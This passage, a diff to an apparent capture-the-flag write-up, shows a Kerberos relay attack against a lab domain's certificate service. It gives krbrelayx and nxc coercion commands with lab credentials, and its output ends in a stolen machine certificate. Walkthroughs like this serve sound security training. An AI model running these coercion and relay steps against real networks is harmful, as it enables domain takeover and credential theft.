@@ -929,6 +929,62 @@ Now i can proceed with coercing auth from the `web-01` machine back to me then u
 
 https://github.com/dirkjanm/krbrelayx
 
+```python
+python3 krbrelayx.py -t https://dc-01.darkcorp.htb/certsrv/certfnsh.asp --adcs -v 'web-01$'
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client SMB loaded..
+[*] Running in attack mode to single host
+[*] Running in kerberos relay mode because no credentials were specified.
+[*] Setting up SMB Server
+[*] Setting up HTTP Server on port 80
+[*] Setting up DNS Server
+
+[*] Servers started, waiting for connections
+```
+
+Ill start up krbrelayx
+
+```python
+nxc smb web-01.darkcorp.htb -u victor.r -p 'victor1gustavo@#' -M coerce_plus -o LISTENER=dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
+SMB         172.16.20.2     445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:None)
+SMB         172.16.20.2     445    WEB-01           [+] darkcorp.htb\victor.r:victor1gustavo@# 
+COERCE_PLUS 172.16.20.2     445    WEB-01           VULNERABLE, PetitPotam
+COERCE_PLUS 172.16.20.2     445    WEB-01           Exploit Success, efsrpc\EfsRpcAddUsersToFile
+COERCE_PLUS 172.16.20.2     445    WEB-01           VULNERABLE, PrinterBug
+COERCE_PLUS 172.16.20.2     445    WEB-01           Exploit Success, spoolss\RpcRemoteFindFirstPrinterChangeNotificationEx
+COERCE_PLUS 172.16.20.2     445    WEB-01           VULNERABLE, MSEven
+```
+
+Then ill use the nxc module for coersion
+
+```python
+[*] Servers started, waiting for connections
+[*] SMBD: Received connection from 10.129.232.7
+[*] HTTP server returned status code 200, treating as a successful login
+[*] SMBD: Received connection from 10.129.232.7
+[*] HTTP server returned status code 200, treating as a successful login
+[*] Generating CSR...
+[*] CSR generated!
+[*] Getting certificate...
+[*] SMBD: Received connection from 10.129.232.7
+[*] HTTP server returned status code 200, treating as a successful login
+[*] SMBD: Received connection from 10.129.232.7
+[*] HTTP server returned status code 200, treating as a successful login
+[*] SMBD: Received connection from 10.129.232.7
+[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
+[*] SMBD: Received connection from 10.129.232.7
+[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
+[*] Skipping user web-01$ since attack was already performed
+[*] GOT CERTIFICATE! ID 6
+[*] Skipping user web-01$ since attack was already performed
+[*] Writing PKCS#12 certificate to ./web-01.pfx
+[*] Certificate successfully written to file
+[*] Skipping user web-01$ since attack was already performed
+```
+
 
 
 
